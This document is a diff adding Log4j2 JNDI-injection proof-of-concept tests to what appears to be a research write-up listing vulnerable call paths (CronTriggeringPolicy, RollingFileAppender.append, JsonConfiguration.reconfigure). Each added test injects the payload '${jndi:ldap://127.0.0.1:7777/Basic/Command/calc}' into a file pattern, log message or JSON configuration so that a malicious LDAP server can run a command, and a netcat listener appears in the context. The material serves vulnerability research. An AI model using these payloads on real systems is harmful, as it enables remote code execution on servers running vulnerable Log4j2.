@@ -49,6 +49,61 @@ nc -l -p 7777
     }
 ```
 
+**CronTriggerPolicy.initialize()**
+
+```
+ @Test
+    public void cronTriggerPolicyTest(){
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+    }
+```
+
+**RollingFileAppender.append()**
+```
+    @Test
+    public void appendRollingFileAppenderTest(){
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(SizeBasedTriggeringPolicy.createPolicy("1B"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        appender.getManager().writeBytes("asdasdasd1".getBytes(), 0 ,10);
+        appender.append(logEvent);
+    }
+```
+
 ## Pocs for Context Tree ##
 
 **LogManager.getContext()**
@@ -174,6 +229,20 @@ This field is utilized within the execute method of AbstractPathAction, which tr
 
         JsonConfigurationFactory factory = new JsonConfigurationFactory();
         Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**JSONConfiguration.reconfigure()**
+
+```
+   @Test
+    public void reconfigureJSONConfigurationFactoryTest() throws IOException {
+        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        JsonConfiguration config = new JsonConfiguration(new LoggerContext("testContext"), source);
+        config.reconfigure();
     }
 ```
 
